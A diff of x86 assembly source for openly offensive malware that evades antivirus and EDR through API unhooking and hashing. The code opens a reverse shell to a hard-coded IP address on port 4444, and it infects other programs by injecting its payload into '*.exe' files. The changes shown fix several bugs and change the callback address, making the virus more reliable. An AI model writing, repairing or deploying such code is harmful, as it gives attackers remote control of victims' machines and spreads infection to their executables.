@@ -11,7 +11,7 @@
 ;	[+] Unhooking API to bypass AVs/EDRs
 ;	[+] Hide API through hashing
 ; This program uses API hashing to get function addresses, referenced from Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com).
-; Size: 1295 bytes
+; Size: 1299 bytes
 ;-------------------------------------------------------------------------------------------------------------------------------------;
 
 .386
@@ -206,14 +206,15 @@ reverse_shell:
 	Mov [Ebp - 108H], Ebx				; This holds the address of the beginning of the payload
 
 	; Load ws2_32.dll library
-	Mov Cx, 3233H
-	Push Ecx
+	Mov Ax, 3233H
+	Push Eax
 	Push 5F327377H
 	Push Esp
 	Push 0726774CH 					; hash('kernel32.dll', 'LoadLibraryA')
 	Call hash_api
 
 	; System call: WSAStartup
+	Xor Ecx, Ecx
 	Mov Cx, 190H
 	Sub Esp, Ecx					; Creating space for WSAData
 	Push Esp					; lpWSAData
@@ -238,7 +239,7 @@ reverse_shell:
 	; connect(SOCKET s, const addr *name, int namelen)
 	; listen on port 4444 (0x5C11), IPv4 set to AF_INET (0x0002) => 5C110002
 	; listen on all interfaces
-	Push 0740A8C0H 					; 192.168.64.7
+	Push 0DE64A8C0H 					; 192.168.100.222
 	Mov Eax, 5C110102H
 	Dec Ah						; 5C110102 => 5C110002 (Remove 01)
 	Push Eax					; namelen 
@@ -283,6 +284,7 @@ zero_mem_struct:
 	Call hash_api					; CreateProcessA
 
 	; Calling WaitForSingleObject
+	Xor Edx, Edx
 	Mov Eax, Esp					; eax = pointer to PROCESS_INFORMATION structure
 	Push Edx					; dwMiliseconds = 0
 	Push DWord Ptr [Eax]
@@ -390,7 +392,7 @@ copy_loop:
 
 	Add Ebx, Eax
 	Mov DWord Ptr [Ebx], 78652E2AH			; "*.ex"
-	Mov Byte Ptr [Ebx + 4H], 65H			; "e"
+	Mov Word Ptr [Ebx + 4H], 065H			; "e"
 
 	Lea Eax, [Ebp - 400H]
 	Push Eax
@@ -423,7 +425,7 @@ process_files_loop:
 	Je infect_next_file
 
 	; If not identical, proceed with injecting
-	Call InjectingFile
+	Jmp InjectingFile
 
 infect_next_file:
 	; Move on to the next exe file
@@ -477,7 +479,7 @@ InjectingFile:
 	Call hash_api
 	Cmp Eax, 0FFFFFFFFH				; Check if handle is valid
 
-	Je exit						; If the handle is invalid => jump to exit
+	Je infect_next_file					; If the handle is invalid => infect the next file
 	Mov [Ebp - 4CH], Eax				; Store the file handle
 
 	Xor Edx, Edx
@@ -541,6 +543,7 @@ InjectingFile:
 
 	Mov Ax, [Edi + 6H]				; Number of section
 	Mov Cl, 0F8H
+	Movzx Ecx, Cl
 	Add Edi, Ecx					; Skip through Optional Header
 	Dec Ax
 	Mov Dl, 40
@@ -625,6 +628,7 @@ InjectingFile:
 	Lea Eax, [Ebp - 6CH]
 	Push Ebx					; lpOverlapped = NULL
 	Push Eax					; lpNumberOfBytesWritten
+	Xor Eax, Eax
 	Mov Ax, PayloadSize
 	Push Eax
 	Mov Edx, [Ebp - 108H]				; Load payload base address to edx
